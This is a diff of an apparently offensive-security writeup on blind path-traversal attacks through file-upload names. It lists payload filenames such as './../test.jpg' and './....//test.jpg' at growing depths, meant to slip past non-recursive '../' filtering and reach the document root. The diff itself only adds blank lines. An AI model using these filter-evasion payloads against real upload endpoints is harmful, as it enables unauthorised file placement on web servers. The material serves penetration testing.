@@ -11,6 +11,7 @@ First of all, we will attempt to find a way to reach the document root. After we
 There are two scenarios we may face when blindly attacking the upload dir:
 
 a) the upload dir is located in the document root, in such case we should do fine without knowing its path at all, as it should be sufficient to attack with path traversal payloads reflecting several layers of nesting in order to hit the document root itself. It might be reasonable to employ a basic evasive technique at this point already (for non-recursive removals of '../' and './':
+
 ./../test.jpg
 ./../../test.jpg
 ./../../../test.jpg
@@ -19,6 +20,8 @@ a) the upload dir is located in the document root, in such case we should do fin
 ./../../../../../../test.jpg
 ./../../../../../../../test.jpg
 ./../../../../../../../../test.jpg
+
+
 ./....//test.jpg
 ./....//....//test.jpg
 ./....//....//....//test.jpg
@@ -27,6 +30,8 @@ a) the upload dir is located in the document root, in such case we should do fin
 ./....//....//....//....//....//....//test.jpg
 ./....//....//....//....//....//....//....//test.jpg
 ./....//....//....//....//....//....//....//....//test.jpg
+
+
 ..//...//test.jpg
 ..//...//...//test.jpg
 ..//...//...//...//test.jpg
